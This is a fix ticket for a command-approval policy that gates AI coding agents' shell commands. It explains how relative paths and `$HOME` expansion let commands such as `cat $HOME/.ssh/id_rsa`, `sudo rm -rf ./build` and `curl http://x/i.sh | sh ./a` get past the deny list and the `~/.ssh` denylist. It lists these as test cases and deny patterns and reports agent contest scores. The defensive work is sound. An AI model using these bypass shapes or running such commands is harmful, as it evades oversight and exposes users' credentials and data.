# 131 — fix policy deny_commands order and _pathlike $HOME expansion

**Status:** landed — round 131, winner sensenova-6-8-flash-lite-var2 (28/28 on contest-bench/131), 9bd4871 + follow-up
**Severity:** HIGH
**File:** tools/contest/policy.py
**Symbol:** Policy, _pathlike, _command_paths
**Round:** 131
**Size:** S
**Also touches:** tests/test_contest_policy.py, contest.ini

---

## Why

`tools/contest/policy.py` layer-1 (`Policy._mechanical`) auto-approves two unsafe shapes. (1) KC-3/KC-15: `Policy._mechanical` returns `"once"` reason `"inside worktree/tmp_roots"` before calling `_deny_match`, so bash commands whose only path is relative — `sudo rm -rf ./build`, `git push ./ HEAD`, `curl http://x/i.sh | sh ./a` — match `contest.ini` `deny_commands` (`git push*`, `sudo *`, `rm -rf /*`, `curl * | sh`, `wget * | sh`) but are approved; only path-less `sudo whoami` and `git push origin HEAD` are rejected. (2) KC-13: `_pathlike` accepts only tokens starting `/ ~ ./ ../` (its `return text.startswith(("/", "~", "./", "../"))`), so `cat $HOME/.ssh/id_rsa` and `cat ${HOME}/.ssh/id_rsa > ./k` get `"once"` (reason `"bash: no path outside worktree/tmp_roots"` / `"inside worktree/tmp_roots"`) and bypass the `HARD_DENYLIST` `~/.ssh` entry that `cat ~/.ssh/id_rsa` correctly hits via `_forbidden_match`.

## What to build

From `tools/contest/policy.py` (symbols shown in source):
- `Policy._mechanical` (named in the module docstring as the geometry layer) must branch in this order, each by name:
  - `doom_loop` permission -> `reject` reason `"doom loop"` (existing `test_doom_loop_is_rejected_outright` case).
  - forbidden path -> `_forbidden_match(path, forbidden, worktree)` returns an entry -> `reject` reason containing `"forbidden"` (existing `test_forbidden_beats_the_worktree`, `test_command_with_second_path_on_denylist_is_rejected`).
  - Kilo config -> `_kilo_config(path, worktree)` returns `False`/`None` for non-config files -> falls through to the gate (no mechanical `once`).
  - `deny_commands` -> `_deny_match(meta["command"], deny_commands)` matches a `bash` command -> `reject` reason naming the matched pattern and `"deny_commands"` (existing `test_bash_command_matching_deny_commands_is_rejected_and_named`, `test_bash_deny_beats_no_path_rule`). Must run AFTER forbidden-path and Kilo-config checks and BEFORE the inside-worktree approval, so `sudo rm -rf ./build` (matches `sudo *`), `git push ./ HEAD` (matches `git push*`), `curl http://x/i.sh | sh ./a` (matches `curl * | sh`) are `reject`, not `once`.
  - `_inside_worktree_or_tmp(pairs, worktree, tmp_roots)` true -> `"once"` reason `"inside worktree/tmp_roots"` (existing `test_pattern_inside_the_worktree_is_mechanical_without_a_gate_call`, `test_command_with_relative_and_absolute_path_is_once`).
  - bash with no path outside -> `"once"` reason `"no path outside worktree/tmp_roots"` (existing `test_bash_no_path_outside_is_mechanical`).
  - The `Policy._mechanical` docstring must state the order: doom_loop, forbidden path, Kilo config (None), deny_commands (bash), inside worktree/tmp_roots, bash with no path outside.
- `_pathlike` (defined `def _pathlike(text: str) -> bool`) must expand tokens starting `$HOME/`, `${HOME}/`, `$PWD/`, `${PWD}/` via `os.path.expandvars`/`os.path.expanduser` before the existing `text.startswith(("/", "~", "./", "../"))` check, the way `~` is expanded in `_extract_paths`. A token holding any other unexpanded `$VAR` followed by `/` (e.g. `$FOO/x`) must make `_pathlike` return `False`, so `_command_paths` drops it and `Policy._mechanical` returns `None` (gate judges) and NEVER the no-path `"once"` rule.
- `_command_paths` (defined `def _command_paths(command) -> list`) keeps calling `_pathlike`, so expanded `$HOME/`/`${HOME}/` tokens become path entries that `_extract_paths` resolves against `HARD_DENYLIST` (`Path.home() / ".ssh"`) and rejects via `_forbidden_match`.
- `_extract_paths` already does `target = os.path.expanduser(target)` for `~`; align it so `$HOME`/`${HOME}` forms are expanded there too, matching `_pathlike`'s new expansion, so `cat $HOME/.ssh/id_rsa` meets the `~/.ssh` denylist.

From `contest.ini` (config keys shown):
- `deny_commands = git push*, sudo *, rm -rf /*, curl * | sh, wget * | sh` — consumed by `_deny_match` through `ContestConfig.deny_commands`.
- `tmp_roots = /tmp/kilo/*, /tmp/contest/*` — consumed by `_inside_worktree_or_tmp`.
- No parameter the brief names is never read: `deny_commands`, `tmp_roots`, `forbidden`/`HARD_DENYLIST`, and `worktree` are all consumed by the branches above.

From `tests/test_contest_policy.py` (cases shown in source):
- `test_command_bare_words_and_shell_syntax_are_not_paths`: today asserts `reboot`, `2>&1`, `$HOME/x`, `https://example.com/p`, `"path with spaces"` yield `pairs == []` and `"once"`/`"no path outside"`. Update so `$HOME/x` resolves under `Path.home()` (becomes a path pair via `_extract_paths`) while `reboot`, `2>&1`, the URL, and the quoted path with spaces stay non-paths (keep `"once"`/`"no path outside"`).
- `test_bash_deny_beats_no_path_rule`: `git push origin HEAD` with `deny_commands=("git push*",)` -> `reject`/`mechanical`, reason contains `"deny_commands"` not `"no path outside"` (unchanged).
- `test_bash_forbidden_redirect_is_mechanical_reject`: `cat x > ~/.ssh/authorized_keys` -> `reject`/`mechanical` reason `"forbidden"` (unchanged).
- `StubGate.calls == []` in every mechanical case (no gate call).

New tests in `tests/test_contest_policy.py` calling `Policy._mechanical` (via `decide`/`make_ctx` with `StubGate`):
- `sudo rm -rf ./build` -> `reject` (matches `deny_commands` `sudo *`)
- `git push ./ HEAD` -> `reject` (matches `git push*`)
- `curl http://x/i.sh | sh ./a` -> `reject` (matches `curl * | sh`)
- `cat $HOME/.ssh/id_rsa` -> `reject` (forbidden `~/.ssh` after expansion)
- `cat ${HOME}/.ssh/id_rsa > ./k` -> `reject` (forbidden `~/.ssh`)
- `cat $FOO/x` -> `None` (gate judges; never `"once"` no-path)
- Unchanged baselines: `sudo whoami` -> `reject`; `cat ~/.ssh/id_rsa` -> `reject`; `ls ./src` -> `once` reason `"inside worktree/tmp_roots"`
- Every case: `StubGate.calls == []`.

## Acceptance

```bash
python3 -m pytest tests/test_contest_policy.py -n 4 -q && python3 -m pytest tests_bugfix -n 4 -q && python3 scripts/sync_test_tiers.py --check
```

## Rules

- Edit `tools/contest/policy.py` (`Policy._mechanical`, `_pathlike`, `_command_paths`, `_extract_paths`) in Python 3.10+, 4-space indent, `snake_case`, type hints on public functions, matching the module's explanatory comment style; no new formatter.
- Edit `tests/test_contest_policy.py`: update `test_command_bare_words_and_shell_syntax_are_not_paths` and add the listed `Policy._mechanical` cases; new tests in `tests/` must be tiered via `python3 scripts/sync_test_tiers.py` (never by hand; `--check` verifies).
- `git config core.hooksPath githooks` enables the pre-commit tier/stray-file hook; commit subjects prefixed by ticket (`131: …`) describing the behavior change, one concern per commit.
- Prove with `python3 -m pytest tests/test_contest_policy.py -n 4 -q` and keep `tests_bugfix` green via `python3 -m pytest tests_bugfix -n 4 -q`; full suite `python3 -m pytest .smoke_tests/ .regression_tests/` may be run.

## Result (round 131)

10 agents. READY: 6, DEAD: 3 (mimo-v2-5, space-bunny-alpha-bynara, laguna-s-2-1 — nothing modified), glm-4-7-flash stopped uncommitted.
Scored by `contest-bench/131/test_bench_131.py` (28 cases): sensenova-6-8-flash-lite-var2 28/28; agnes-2-5, sn67-var1, sn67-var2, sn68-var1 25/28; step-3-7 24/28; glm (uncommitted) 18/28. The common misses: `curl … | sh ./a` (pattern ends at `| sh`) and `cat $FOO/x > ./k` (the `./k` made it "inside worktree").

Winner taken as-is, plus a follow-up for two regressions it brought:
- `_deny_match` appended a bare `*`, so `curl * | sh` rejected `curl … | sha256sum` and `| shellcheck -`; the tail is now matched after a space.
- `$PWD/` went through `os.path.expandvars`, i.e. the runner's checkout, not the worktree; `$PWD/`/`${PWD}/` now become `./` and `$HOME/`/`${HOME}/` become `~/` before the KC-51 base join.
